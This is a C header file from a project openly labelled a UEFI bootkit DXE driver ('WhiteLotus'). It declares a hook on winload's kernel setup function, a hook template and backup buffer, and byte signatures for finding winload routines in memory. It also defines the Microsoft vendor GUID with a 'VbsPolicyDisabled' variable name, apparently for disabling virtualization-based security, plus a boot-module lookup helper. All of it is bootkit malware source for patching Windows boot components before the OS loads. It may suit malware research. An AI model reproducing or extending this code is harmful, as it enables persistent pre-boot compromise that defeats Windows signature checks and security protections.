/*
 * ============================================================
 *  Project  : WhiteLotus — UEFI Bootkit DXE Driver
 *  File     : PatchWinload.h
 * ============================================================
 *
 *  Description:
 *    Declares PatchNtoskrnl, the OslFwpKernelSetupPhase1
 *    function typedef, winload byte-pattern signatures
 *    (OslFwpKernelSetupPhase1, BlStatusPrint), Microsoft VBS
 *    policy EFI GUID and variable name constants, and the
 *    boot-loader module list enumeration helper
 *    (GetBootLoadedModule).
 *
 *  Purpose:
 *    - Share winload patch state and signature data between
 *      PatchWinload.c and PatchKernel.c.
 *
 *  Author   : 0xbekoo
 *  Blog     : https://0xbekoo.github.io
 *  Updated  : 2026-05-21
 *
 * ============================================================
 */

#include "WhiteLotus.h"
#include <Guid/Acpi.h>

EFI_STATUS EFIAPI PatchNtoskrnl(
	IN CONST VOID* ImageBase,
	IN PEFI_IMAGE_NT_HEADERS NtHeaders
	);

typedef
EFI_STATUS
(EFIAPI*
t_OslFwpKernelSetupPhase1)(
	IN PLOADER_PARAMETER_BLOCK LoaderBlock
	);

extern CONST UINT8 gHookTemplate[(sizeof(VOID*) / 4) + sizeof(VOID*) + 2];
extern CONST UINTN gHookTemplateAddressOffset;


t_OslFwpKernelSetupPhase1 gOriginalOslFwpKernelSetupPhase1 = NULL;
UINT8 gOslFwpKernelSetupPhase1Backup[sizeof(gHookTemplate)] = { 0 };



STATIC CONST UINT8 SigOslFwpKernelSetupPhase1[] = {
	0x89, 0xCC, 0x24, 0x01, 0x00, 0x00,				// mov [REG+124h], r32
	0xE8, 0xCC, 0xCC, 0xCC, 0xCC,					// call BlBdStop
	0xCC, 0x8B, 0xCC								// mov r32, r/m32
};

STATIC UNICODE_STRING ImgpFilterValidationFailureMessage = RTL_CONSTANT_STRING(L"*** Windows is unable to verify the signature of"); // newline, etc etc...

// Signature for winload!BlStatusPrint. This is only needed if winload.efi does not export it (RS4 and earlier)
// Windows 10 only. I could find a universal signature for this, but I rarely need the debugger output anymore...
STATIC CONST UINT8 SigBlStatusPrint[] = {
	0x48, 0x8B, 0xC4,								// mov rax, rsp
	0x48, 0x89, 0x48, 0x08,							// mov [rax+8], rcx
	0x48, 0x89, 0x50, 0x10,							// mov [rax+10h], rdx
	0x4C, 0x89, 0x40, 0x18,							// mov [rax+18h], r8
	0x4C, 0x89, 0x48, 0x20,							// mov [rax+20h], r9
	0x53,											// push rbx
	0x48, 0x83, 0xEC, 0x40,							// sub rsp, 40h
	0xE8, 0xCC, 0xCC, 0xCC, 0xCC,					// call BlBdDebuggerEnabled
	0x84, 0xC0,										// test al, al
	0x74, 0xCC										// jz XX
};

// EFI vendor GUID used by Microsoft
STATIC CONST EFI_GUID MicrosoftVendorGuid = {
	0x77fa9abd, 0x0359, 0x4d32, { 0xbd, 0x60, 0x28, 0xf4, 0xe7, 0x8f, 0x78, 0x4b }
};

STATIC CONST CHAR16 VbsPolicyDisabledVariableName[] = L"VbsPolicyDisabled";

extern KERNEL_PATCH_INFORMATION gKernelPatchInfo;

STATIC
PKLDR_DATA_TABLE_ENTRY
EFIAPI
GetBootLoadedModule(
	IN CONST LIST_ENTRY* LoadOrderListHead,
	IN CONST CHAR16* ModuleName
	)
{
	if (ModuleName == NULL || LoadOrderListHead == NULL)
		return NULL;

	for (LIST_ENTRY* ListEntry = LoadOrderListHead->ForwardLink; ListEntry != LoadOrderListHead; ListEntry = ListEntry->ForwardLink)
	{
		// This is fairly heavy abuse of CR(), but legal C because (only) the first field of a struct is guaranteed to be at offset 0 (C99 6.7.2.1, point 13)
		CONST PBLDR_DATA_TABLE_ENTRY Entry = (PBLDR_DATA_TABLE_ENTRY)BASE_CR(ListEntry, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
		if (Entry != NULL && StrniCmp(Entry->KldrEntry.BaseDllName.Buffer, ModuleName, (Entry->KldrEntry.BaseDllName.Length / sizeof(CHAR16))) == 0)
			return &Entry->KldrEntry;
	}
	return NULL;
}




